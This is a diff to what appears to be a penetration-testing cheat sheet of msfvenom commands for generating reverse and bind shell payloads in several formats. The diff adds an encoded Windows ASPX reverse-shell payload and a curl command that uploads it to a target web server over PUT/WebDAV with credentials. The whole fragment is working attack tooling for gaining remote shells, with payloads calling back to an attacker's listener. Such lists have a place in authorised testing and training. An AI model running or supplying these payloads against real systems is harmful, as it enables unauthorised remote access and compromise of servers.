@@ -57,7 +57,11 @@ msfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp
+msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -f aspx -o shell.aspx
 msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
+
+# Upload ASPX shell when the web root or upload path accepts PUT/WebDAV.
+curl -T shell.aspx 'http://<TARGET_IP>/<UPLOAD_PATH>/shell.aspx' -u '<USER>:<PASS>'
 
 # Unix command payloads.
 msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py
